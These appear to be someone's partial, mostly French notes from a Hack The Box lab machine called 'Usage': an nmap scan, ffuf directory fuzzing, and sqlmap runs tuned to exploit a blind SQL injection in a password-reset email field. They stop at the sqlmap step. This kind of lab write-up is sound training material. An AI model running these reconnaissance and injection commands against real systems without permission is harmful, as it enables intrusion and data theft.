# Usage 
```shell
nmap -sV -sC 10.10.11.18
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0f8fdd304b807a063dd37dfd7eeca78 (ECDSA)
|_  256 bd22f5287727fb65baf6fd2f10c7828f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
# add usage.htb to /etc/hosts
ffuf -u 'http://usage.htb/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 162
login
logout
# on check avec firefox, on find un sous domaine admin.sage.htb, add to /etc/hosts
# dans forget-password, on try email admin@usage.htb, il existe, on add ' a la fin on a erreur 500
# possible sql injection, on intercept requete avec burp puis 
sqlmap -r req.txt
# fonctionne pas, on fait recherche sur blind sqli avec slqmap, on lit help de sqlmap
sqlmap -hh
# on va use boolean based technique et augmenter le niveau, add un suffixe comme ' qui a permis davoir linjection
sqlmap -r req2.txt --technique "BU" --threads=1 --suffix="'" --level 5
# fonctionne pas, on check encore les options, on sait que reponse est differente quand on a bonne email addresse, on add 
# string dans sqlmap qui definie quand cest good, on suppose que cest mysql dbms car linux machine
sqlmap -r req2.txt --technique "BUT" --threads=1 --suffix="-- #" –string "We have e-mailed" --level 3 --risk 3 --dbms=mysql -p email 










```
